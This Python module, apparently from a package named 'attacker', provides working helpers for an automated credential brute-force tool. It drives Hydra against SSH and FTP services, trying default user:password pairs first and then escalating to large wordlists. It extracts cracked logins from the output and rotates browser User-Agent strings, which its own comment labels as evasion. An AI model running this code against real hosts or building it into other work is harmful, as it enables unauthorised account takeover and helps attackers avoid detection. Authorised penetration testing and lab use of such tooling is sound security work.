from __future__ import annotations

import logging
import random
import re
import socket
import subprocess
import sys
import time
import urllib.error
import urllib.request
from collections.abc import Callable
from dataclasses import dataclass, field
from datetime import datetime
from pathlib import Path

from attacker.wordlists import (
    ensure_ftp_default_credentials,
    ensure_password_wordlist,
    ensure_ssh_default_credentials,
    ensure_username_wordlist,
)

logger = logging.getLogger(__name__)

__all__ = [
    "BruteforceResult",
    "HttpResponse",
    "ResultsDir",
    "http_request",
    "is_reachable",
    "make_results_dir",
    "prompt_yes_no",
    "resolve_default_credentials",
    "resolve_password_wordlist",
    "resolve_username_wordlist",
    "run_command",
    "run_credential_bruteforce",
    "run_hydra",
]

_BROWSER_USER_AGENTS = (
    # Chrome — Windows / macOS / Linux
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36",
    # Firefox — Windows / macOS / Linux
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:126.0) Gecko/20100101 Firefox/126.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:125.0) Gecko/20100101 Firefox/125.0",
    "Mozilla/5.0 (X11; Linux x86_64; rv:124.0) Gecko/20100101 Firefox/124.0",
    # Safari — macOS
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4.1 Safari/605.1.15",
    # Edge — Windows
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36 Edg/125.0.0.0",
)


def _random_user_agent() -> str:
    """Pick a realistic browser User-Agent, varied on each call."""
    return random.choice(_BROWSER_USER_AGENTS)  # noqa: S311 — evasion, not crypto


class _NoRedirectHandler(urllib.request.HTTPRedirectHandler):
    """Returning None tells urllib to surface the 3xx response untouched.

    Login detection depends on seeing the redirect status + Set-Cookie that a
    successful authentication returns; following it silently would hide both.
    """

    def redirect_request(self, *args: object, **kwargs: object) -> None:
        return None


_NO_REDIRECT_OPENER = urllib.request.build_opener(_NoRedirectHandler)


@dataclass(frozen=True)
class CommandResult:
    return_code: int
    stdout: str
    stderr: str
    duration_s: float
    cmd: tuple[str, ...]
    timed_out: bool = False

    @property
    def ok(self) -> bool:
        return self.return_code == 0 and not self.timed_out


def run_command(
    cmd: list[str],
    *,
    timeout: float | None = None,
    cwd: Path | None = None,
    log_to: Path | None = None,
) -> CommandResult:
    logger.debug("$ %s  (timeout=%s)", " ".join(cmd), timeout)
    start = time.monotonic()
    timed_out = False

    try:
        completed = subprocess.run(
            cmd,
            capture_output=True,
            text=True,
            timeout=timeout,
            cwd=cwd,
            check=False,
        )
        stdout = completed.stdout or ""
        stderr = completed.stderr or ""
        return_code = completed.returncode
    except subprocess.TimeoutExpired as exc:
        timed_out = True
        stdout = (
            exc.stdout.decode() if isinstance(exc.stdout, bytes) else (exc.stdout or "")
        )
        stderr = (
            exc.stderr.decode() if isinstance(exc.stderr, bytes) else (exc.stderr or "")
        )
        return_code = 124
    except FileNotFoundError:
        return CommandResult(
            return_code=127,
            stdout="",
            stderr=f"command not found: {cmd[0]}",
            duration_s=0.0,
            cmd=tuple(cmd),
        )

    duration = time.monotonic() - start
    if log_to is not None:
        log_to.parent.mkdir(parents=True, exist_ok=True)
        log_to.write_text(
            f"$ {' '.join(cmd)}\n"
            f"--- stdout ---\n{stdout}\n"
            f"--- stderr ---\n{stderr}\n"
            f"--- rc={return_code} duration={duration:.1f}s ---\n",
            encoding="utf-8",
        )

    return CommandResult(
        return_code=return_code,
        stdout=stdout,
        stderr=stderr,
        duration_s=duration,
        cmd=tuple(cmd),
        timed_out=timed_out,
    )


@dataclass(frozen=True)
class HttpResponse:
    method: str
    path: str
    status: int | None
    error: str = ""
    headers: dict[str, str] = field(default_factory=dict)
    body: str = ""
    elapsed_s: float = 0.0

    @property
    def ok(self) -> bool:
        return self.status is not None

    def header(self, name: str) -> str:
        return self.headers.get(name.lower(), "")


def _collect_headers(message: object) -> dict[str, str]:
    # http.client.HTTPMessage.items() yields duplicates (notably Set-Cookie);
    # fold them so cookie/auth detection still sees every value.
    collected: dict[str, str] = {}
    for key, value in getattr(message, "items", list)():
        lower = key.lower()
        collected[lower] = (
            f"{collected[lower]}, {value}" if lower in collected else value
        )
    return collected


def _build_response(
    method: str,
    path: str,
    status: int | None,
    source: object,
    *,
    start: float,
    capture_body: bool,
    max_body: int,
) -> HttpResponse:
    headers = _collect_headers(getattr(source, "headers", None) or [])
    body_text = ""
    if capture_body:
        try:
            raw = source.read(max_body + 1)  # type: ignore[attr-defined]
        except Exception:  # noqa: BLE001 — body is best-effort
            raw = b""
        if isinstance(raw, bytes):
            body_text = raw[:max_body].decode("utf-8", "replace")
    return HttpResponse(
        method=method,
        path=path,
        status=status,
        headers=headers,
        body=body_text,
        elapsed_s=time.monotonic() - start,
    )


def http_request(
    base_url: str,
    path: str,
    *,
    method: str = "GET",
    headers: dict[str, str] | None = None,
    body: bytes | None = None,
    timeout: float = 10.0,
    capture_body: bool = False,
    max_body: int = 200_000,
    allow_redirects: bool = True,
) -> HttpResponse:
    url = base_url.rstrip("/") + path
    full_headers: dict[str, str] = {"User-Agent": _random_user_agent()}
    if headers:
        full_headers.update(headers)

    request = urllib.request.Request(
        url,
        method=method,
        data=body,
        headers=full_headers,
    )
    opener = urllib.request.urlopen if allow_redirects else _NO_REDIRECT_OPENER.open
    start = time.monotonic()
    try:
        with opener(request, timeout=timeout) as response:  # noqa: S310
            return _build_response(
                method,
                path,
                response.status,
                response,
                start=start,
                capture_body=capture_body,
                max_body=max_body,
            )
    except urllib.error.HTTPError as exc:
        return _build_response(
            method,
            path,
            exc.code,
            exc,
            start=start,
            capture_body=capture_body,
            max_body=max_body,
        )
    except urllib.error.URLError as exc:
        return HttpResponse(
            method=method,
            path=path,
            status=None,
            error=str(exc.reason),
            elapsed_s=time.monotonic() - start,
        )
    except (TimeoutError, OSError) as exc:
        return HttpResponse(
            method=method,
            path=path,
            status=None,
            error=str(exc),
            elapsed_s=time.monotonic() - start,
        )


@dataclass
class ResultsDir:
    base: Path
    prefix: str
    timestamp: str = field(
        default_factory=lambda: datetime.now().strftime("%Y%m%d-%H%M%S")
    )

    @property
    def path(self) -> Path:
        return self.base / f"{self.prefix}-{self.timestamp}"

    def ensure(self) -> Path:
        self.path.mkdir(parents=True, exist_ok=True)
        return self.path

    def file(self, name: str) -> Path:
        self.ensure()
        return self.path / name


def make_results_dir(base: Path, prefix: str) -> ResultsDir:
    results = ResultsDir(base=base, prefix=prefix)
    results.ensure()
    return results


def is_reachable(host: str, port: int, *, timeout: float = 5.0) -> bool:
    try:
        with socket.create_connection((host, port), timeout=timeout):
            return True
    except OSError:
        return False


def resolve_password_wordlist(override: Path | None) -> Path | None:
    if override is not None and override.is_file():
        return override

    return ensure_password_wordlist()


def resolve_username_wordlist(override: Path | None) -> Path | None:
    if override is not None and override.is_file():
        return override

    return ensure_username_wordlist()


def resolve_default_credentials(override: Path | None, protocol: str) -> Path | None:
    """Resolve the service's default-credential list (``user:password`` pairs).

    These SecLists lists are already in Hydra's ``-C`` combo format, so they can
    be fed straight into a brute-force as a quick "known defaults" first pass.
    """
    if override is not None and override.is_file():
        return override

    if protocol == "ssh":
        return ensure_ssh_default_credentials()

    if protocol == "ftp":
        return ensure_ftp_default_credentials()

    logger.warning("No default-credential list known for protocol %r", protocol)
    return None


def prompt_yes_no(question: str, *, default: bool = False) -> bool:
    """Ask a yes/no question on the terminal.

    Non-interactive sessions (no TTY) can't answer, so we fall back to
    ``default`` instead of blocking forever on ``input()``.
    """
    if not sys.stdin.isatty():
        logger.info(
            "Non-interactive session; assuming '%s' for: %s",
            "yes" if default else "no",
            question,
        )
        return default

    suffix = "[Y/n]" if default else "[y/N]"
    try:
        answer = input(f"{question} {suffix} ").strip().lower()
    except EOFError:
        return default

    if not answer:
        return default

    return answer in {"y", "yes"}


_HYDRA_CRED_RE = re.compile(r"login:\s*(?P<user>.*?)\s+password:\s*(?P<pass>.*?)\s*$")


def run_hydra(
    protocol: str,
    host: str,
    port: int,
    tasks: int,
    timeout: int,
    results: ResultsDir,
    *,
    username_wordlist: Path | None = None,
    password_wordlist: Path | None = None,
    combo_wordlist: Path | None = None,
    label: str = "",
) -> tuple[int, list[tuple[str, str]]]:
    """Run Hydra against ``protocol://host:port``.

    Pass ``combo_wordlist`` to test ``user:password`` pairs (Hydra ``-C``), or
    ``username_wordlist`` + ``password_wordlist`` for a full cross-product
    (``-L``/``-P``). ``label`` keeps each phase's artefacts in distinct files.
    """
    suffix = f"-{label}" if label else ""
    output_file = results.file(f"hydra-results{suffix}.txt")
    output_log = results.file(f"hydra{suffix}.log")

    cmd = ["hydra"]
    if combo_wordlist is not None:
        cmd += ["-C", str(combo_wordlist)]
    else:
        if username_wordlist is None or password_wordlist is None:
            raise ValueError(
                "run_hydra needs combo_wordlist or both username/password wordlists"
            )
        cmd += ["-L", str(username_wordlist), "-P", str(password_wordlist)]
    cmd += [
        "-s",
        str(port),
        "-t",
        str(tasks),
        "-vV",
        "-o",
        str(output_file),
        f"{protocol}://{host}",
    ]
    # timeout <= 0 means "no wall-clock limit": let hydra run the whole wordlist
    # to completion. A fixed budget would otherwise kill it part-way through a
    # large (e.g. 10k) password list, leaving most candidates untested.
    wall_clock = timeout + 10 if timeout > 0 else None
    source = (
        f"combo={combo_wordlist}"
        if combo_wordlist is not None
        else f"users={username_wordlist}, passwords={password_wordlist}"
    )
    logger.info(
        "hydra against %s://%s:%d (%s, timeout=%s)",
        protocol,
        host,
        port,
        source,
        "none" if wall_clock is None else f"{wall_clock}s",
    )

    result = run_command(cmd, timeout=wall_clock, log_to=output_log)
    if result.return_code == 127:
        logger.error("hydra binary not found")
        return 0, []

    if result.timed_out:
        logger.warning(
            "hydra hit the %ds timeout before finishing the wordlist; "
            "pass --hydra-timeout 0 to test every password",
            timeout,
        )

    tag = f"[{port}][{protocol}]"
    attempts = 0
    found: list[tuple[str, str]] = []
    for line in result.stdout.splitlines():
        if tag not in line:
            continue

        attempts += 1
        match = _HYDRA_CRED_RE.search(line)
        if match:
            found.append((match["user"], match["pass"]))

    logger.info(
        "hydra completed in %.1fs (%d attempts, %d credential(s) accepted)",
        result.duration_s,
        attempts,
        len(found),
    )
    return attempts, found


@dataclass
class BruteforceResult:
    attempts: int = 0
    found: list[tuple[str, str]] = field(default_factory=list)
    phases: list[str] = field(default_factory=list)


def run_credential_bruteforce(
    protocol: str,
    host: str,
    port: int,
    *,
    tasks: int,
    timeout: int,
    results: ResultsDir,
    default_credentials: Path | None,
    username_wordlist: Path | None,
    password_wordlist: Path | None,
    use_full_wordlist: bool = False,
    confirm_escalation: Callable[[str], bool] | None = None,
) -> BruteforceResult:
    """Brute-force credentials, defaults first then (optionally) a big wordlist.

    The default flow tries the service's *known default* ``user:password`` pairs
    (fast, high signal). Only when that finds nothing do we reach for the large
    cross-product wordlist — either because ``use_full_wordlist`` forced it, or
    because ``confirm_escalation`` (an interactive prompt) said yes. We never run
    the large list silently: it is slow and noisy, so escalating is opt-in.
    """
    outcome = BruteforceResult()

    def _run_full() -> None:
        if username_wordlist is None or password_wordlist is None:
            logger.error(
                "No username/password wordlist available; cannot run the full "
                "brute-force phase"
            )
            return
        logger.warning(
            "Running the LARGE wordlist brute-force against %s://%s:%d — this is "
            "slow and noisy.",
            protocol,
            host,
            port,
        )
        attempts, found = run_hydra(
            protocol,
            host,
            port,
            tasks,
            timeout,
            results,
            username_wordlist=username_wordlist,
            password_wordlist=password_wordlist,
            label="full",
        )
        outcome.attempts += attempts
        outcome.found.extend(found)
        outcome.phases.append("full-wordlist")

    if use_full_wordlist:
        logger.info("Skipping default-credential phase (--full-wordlist requested)")
        _run_full()
        return outcome

    if default_credentials is None:
        logger.warning(
            "No %s default-credential list available; falling back to the full "
            "wordlist",
            protocol,
        )
        _run_full()
        return outcome

    logger.info(
        "Phase 1: %s default-credential brute-force (%s)",
        protocol,
        default_credentials,
    )
    attempts, found = run_hydra(
        protocol,
        host,
        port,
        tasks,
        timeout,
        results,
        combo_wordlist=default_credentials,
        label="default",
    )
    outcome.attempts += attempts
    outcome.found.extend(found)
    outcome.phases.append("default-credentials")

    if found:
        logger.info(
            "Default credentials cracked %d login(s); skipping the large wordlist",
            len(found),
        )
        return outcome

    logger.warning(
        "No default credentials worked against %s://%s:%d.", protocol, host, port
    )
    question = "Escalate to the large wordlist brute-force (slow and noisy)?"
    if confirm_escalation is not None and confirm_escalation(question):
        _run_full()
    else:
        logger.warning(
            "Skipping the large wordlist. Re-run with --full-wordlist to force it."
        )
    return outcome
